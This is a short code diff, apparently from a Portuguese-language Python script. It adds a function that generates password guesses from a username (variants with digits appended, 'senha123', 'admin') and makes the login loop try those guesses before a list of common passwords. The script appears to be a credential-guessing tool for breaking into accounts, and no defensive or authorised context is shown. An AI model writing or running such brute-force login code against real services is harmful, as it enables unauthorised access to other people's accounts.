@@ -65,8 +65,32 @@ def tentar_login(usuario, senha, senhas_usadas, lock):
         print(f"Erro de requisição para {usuario}. Tentando novamente: {e}")
         return False
 
+def gerar_senhas(usuario):
+    login_sem_underline = usuario.replace("_", "")
+    senhas = [
+        f"{usuario}",
+        f"{usuario.upper()}",
+        f"{login_sem_underline}",
+        f"{usuario}123",
+        f"{login_sem_underline}123",
+        f"{usuario}1234",
+        f"{login_sem_underline}1234",
+        f"{usuario}12345",
+        f"{login_sem_underline}12345",
+        f"{usuario}0123",
+        f"{login_sem_underline}0123",
+        "senha123",
+        "admin"
+    ]
+    return senhas
+
 def tentar_varios_logins(usuario, senhas_comuns, lock):
     senhas_usadas = set()
+
+    senhas_geradas = gerar_senhas(usuario)
+    for senha in senhas_geradas:
+        if tentar_login(usuario, senha, senhas_usadas, lock):
+            return
 
     for senha in senhas_comuns:
         if tentar_login(usuario, senha, senhas_usadas, lock):
